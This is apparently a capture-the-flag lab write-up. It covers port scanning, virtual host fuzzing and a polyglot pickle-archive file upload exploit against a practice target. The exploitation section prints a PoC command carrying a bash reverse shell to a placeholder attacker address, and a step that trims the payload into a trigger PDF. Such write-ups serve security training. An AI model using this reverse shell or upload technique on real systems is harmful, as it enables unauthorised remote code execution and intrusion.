## Web Infrastructure Enumeration & Polyglot Payload Exploitation

### Summary

- **Focus Area:** Web Service Reconnaissance, Virtual Host Discovery, and Arbitrary File Upload Exploitation
    
- **Key Tasks:** Network Port Scanning, Subdomain Fuzzing, and Proof-of-Concept Execution
    

### Enumeration Methodology

#### 1. Port & Service Discovery

Executed port scanning to identify open services and service versions on the target host.

Bash

```
# Initial Port Scan
sudo nmap -p 22,80 -sCV target.htb -oA target_scan
```

- **Port 22:** OpenSSH (Linux / Debian)
    
- **Port 80:** Apache HTTP Server (Redirection to domain identified)
    

#### 2. Virtual Host Fuzzing

Performed virtual host discovery to identify internal web applications filtered by HTTP Host headers.

Bash

```
# Subdomain/Virtual Host Enumeration with Word Filtering
ffuf -w /path/to/vhosts.txt:FUZZ -u http://target.htb/ -H "Host: FUZZ.target.htb" -fw <default_word_count>
```

- **Outcome:** Discovered a distinct virtual host endpoint (`research.target.htb`) returning a unique HTTP status and response length.
    

### Exploitation Concepts & Execution

#### Polyglot File Upload & Code Execution

Exploited an application processing compressed archives/documents via a polyglot file vulnerability.

1. **Payload Generation:** Built a customized archive containing an encoded reverse shell payload directed to a specified upload path.
    
2. **File Processing:** Extracted the secondary trigger file from the generated payload buffer to align with the application's expected file header requirements.
    

Bash

```
# Payload Generation via PoC Tool
uv run exploit.py -p "/target/upload/path/payload" -c "bash -c 'bash -i >& /dev/tcp/10.10.X.X/4444 0>&1'"

# Trimming Payload Buffer to Produce Valid Trigger Document
tail -c +115 payload.pickle.gz > trigger.pdf
```

3. **Execution Chain:**
    
    - Started a netcat listener locally.
        
    - Uploaded both the compressed payload archive and the corresponding trigger document.
        
    - Triggered server-side processing to establish an interactive reverse shell connection.
        

### Key Takeaways

- Virtual host fuzzing with word/size filtering is essential when standard directory brute-forcing yields minimal results.
    
- Polyglot payloads leverage weak file header validation or multi-format processing libraries to achieve remote code execution (RCE).